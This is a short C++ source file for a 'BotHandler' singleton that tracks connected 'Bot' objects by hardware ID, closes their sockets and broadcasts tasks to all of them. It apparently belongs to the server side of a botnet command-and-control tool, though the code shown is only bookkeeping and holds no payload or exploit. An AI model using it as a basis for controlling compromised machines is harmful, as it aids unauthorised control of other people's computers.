#include "BotHandler.h"

BotHandler *BotHandler::Instance = nullptr;

BotHandler *BotHandler::getInstance() {
  if (Instance == NULL) {
    Instance = new BotHandler();
  }

  return Instance;
}

void BotHandler::addBot(class Bot *bot) {
  BotList.insert(BotMapPair(bot->getHWID(), bot));
}

void BotHandler::removeBot(std::string *HWID) {
  Bot *bot = BotList[*HWID];
  BotList.erase(*HWID);
  closesocket(*(bot->getBotSocket()));
  delete bot;
}

Bot *BotHandler::getBot(std::string *HWID) { return BotList[*HWID]; }

void BotHandler::addTaskToAllBots(class Task *task) {
  for (auto iter = getBotListIteratorBegin(); iter != getBotListIteratorEnd();
       iter++) {
    iter->second->addTaskQueue(task);
  }
}

int BotHandler::getBotCount() { return BotList.size(); }

BotHandler::BotMapIter BotHandler::getBotListIteratorBegin() {
  return BotList.begin();
}

BotHandler::BotMapIter BotHandler::getBotListIteratorEnd() {
  return BotList.end();
}